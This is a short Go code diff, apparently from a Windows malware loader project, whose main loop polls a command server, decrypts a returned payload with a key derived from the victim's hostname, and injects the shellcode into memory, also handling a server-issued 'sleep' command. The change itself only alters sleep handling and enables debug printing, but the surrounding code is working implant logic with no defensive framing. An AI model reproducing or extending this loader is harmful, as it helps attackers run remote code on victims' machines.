@@ -9,6 +9,7 @@ import (
 	_ "embed"
 	b64 "encoding/base64"
 	"encoding/hex"
+	"fmt"
 	"golang.org/x/sys/windows"
 	"strconv"
 	"strings"
@@ -47,11 +48,7 @@ func main() {
 		body, err = malwareUtil.Request(cookieName, conf)
 		// if the response is not a shellcode, sleep and try again
 		if len(body) < 10 {
-			t, _ := strconv.Atoi(string(body))
-			malwareUtil.Sleep(t)
-			if err != nil || len(body) == 0 {
-				malwareUtil.Sleep(sleepTime)
-			}
+			malwareUtil.Sleep(sleepTime)
 		} else {
 			key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
 			hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
@@ -63,12 +60,12 @@ func main() {
 				inject(shellcode)
 				return
 			case "sleep":
-				//fmt.Println("sleeping", string(task.Payload))
+				fmt.Println("sleeping", string(task.Payload))
 				sleepTime, _ = strconv.Atoi(string(task.Payload))
 				malwareUtil.Sleep(sleepTime)
 			}
 		}
-		//fmt.Println(body)
+		fmt.Println("body :", string(body))
 	}
 }
 
